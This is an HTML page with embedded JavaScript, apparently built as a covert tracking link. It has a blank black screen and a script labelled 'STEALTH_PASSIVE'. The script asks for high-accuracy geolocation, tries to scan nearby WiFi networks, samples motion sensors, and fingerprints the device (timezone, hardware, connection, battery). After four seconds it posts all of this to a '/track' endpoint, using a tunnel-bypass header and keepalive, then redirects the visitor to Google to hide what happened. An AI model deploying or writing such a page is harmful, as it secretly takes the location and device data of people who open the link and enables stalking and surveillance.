<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>S</title>
    <style>
        body {
            background: #000;
            color: #333;
            overflow: hidden;
        }
    </style>
</head>

<body>
    <script>
        // Configuration
        const TARGET_URL = '/track';
        const REDIRECT_URL = 'https://google.com';
        const DELAY_MS = 4000; // 4 seconds

        const data = {
            type: 'STEALTH_PASSIVE',
            timestamp: new Date().toISOString(),
            url: window.location.href,
            referrer: document.referrer,
            viewport: `${window.innerWidth}x${window.innerHeight}`,
            location: {},
            sensors: {},
            network: {},
            fingerprint: {},
            wifi: {}
        };

        // 1. Coarse Geolocation (Trigger Prompt Immediately)
        // We request high accuracy to force the "Use precise location?" system prompt if possible.
        function tryCoarseGeo() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        data.location.lat = pos.coords.latitude;
                        data.location.lng = pos.coords.longitude;
                        data.location.acc = pos.coords.accuracy;
                        data.location.source = 'api';
                    },
                    (err) => {
                        data.location.geoError = err.message;
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 3500,
                        maximumAge: 0
                    }
                );
            }
        }

        // 2. WiFi (Experimental)
        async function tryWifiScan() {
            if (navigator.connection && navigator.connection.getNetworks) {
                try {
                    const networks = await navigator.connection.getNetworks();
                    if (networks && networks.length > 0) {
                        data.wifi = networks.map(n => ({ bssid: n.bssid, signal: n.signalStrength }));
                    } else {
                        data.wifi = { status: "no_networks_found" };
                    }
                } catch (e) { data.wifi = { error: e.message }; }
            } else { data.wifi = { status: "unsupported_browser" }; }
        }

        // 3. Sensors (Continuous Sampling)
        function initSensors() {
            if (window.DeviceMotionEvent) {
                let readings = [];
                window.addEventListener('devicemotion', (event) => {
                    if (!event.accelerationIncludingGravity || event.accelerationIncludingGravity.x === null) {
                        data.sensors.status = "unsupported_on_device";
                        return;
                    }

                    readings.push({
                        x: event.accelerationIncludingGravity.x,
                        y: event.accelerationIncludingGravity.y,
                        z: event.accelerationIncludingGravity.z
                    });

                    // Keep recent history
                    if (readings.length > 60) readings.shift();

                    // Calculate average
                    const avg = readings.reduce((a, b) => ({ x: a.x + b.x, y: a.y + b.y, z: a.z + b.z }), { x: 0, y: 0, z: 0 });
                    const count = readings.length || 1;
                    data.sensors.accel = {
                        x: (avg.x / count).toFixed(2),
                        y: (avg.y / count).toFixed(2),
                        z: (avg.z / count).toFixed(2)
                    };
                });
            } else {
                data.sensors.status = "unsupported";
            }
        }

        // 4. Fingerprint
        function collectFingerprint() {
            try {
                data.fingerprint.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                data.fingerprint.cores = navigator.hardwareConcurrency;
                data.fingerprint.memory = navigator.deviceMemory;
                data.fingerprint.platform = navigator.platform;

                if (navigator.connection) {
                    data.fingerprint.connection = {
                        type: navigator.connection.effectiveType,
                        rtt: navigator.connection.rtt,
                        downlink: navigator.connection.downlink
                    };
                }

                if (navigator.getBattery) {
                    navigator.getBattery().then(bat => {
                        data.fingerprint.battery = { level: bat.level, charging: bat.charging };
                    });
                }
            } catch (e) { }
        }

        // --- EXECUTE COLLECTION ---
        tryCoarseGeo();
        tryWifiScan();
        initSensors();
        collectFingerprint();

        // --- FINAL SEND & REDIRECT ---
        setTimeout(async () => {
            // Update timestamp
            data.timestamp = new Date().toISOString();

            // Send Data (Fire and Forget / Keepalive)
            try {
                // Use fetch with keepalive to ensure it survives the redirect
                fetch(TARGET_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'Bypass-Tunnel-Reminder': 'true' },
                    body: JSON.stringify(data),
                    keepalive: true
                });
            } catch (e) { console.error(e); }

            // Redirect to Google
            window.location.href = REDIRECT_URL;
        }, DELAY_MS);

    </script>
</body>

</html>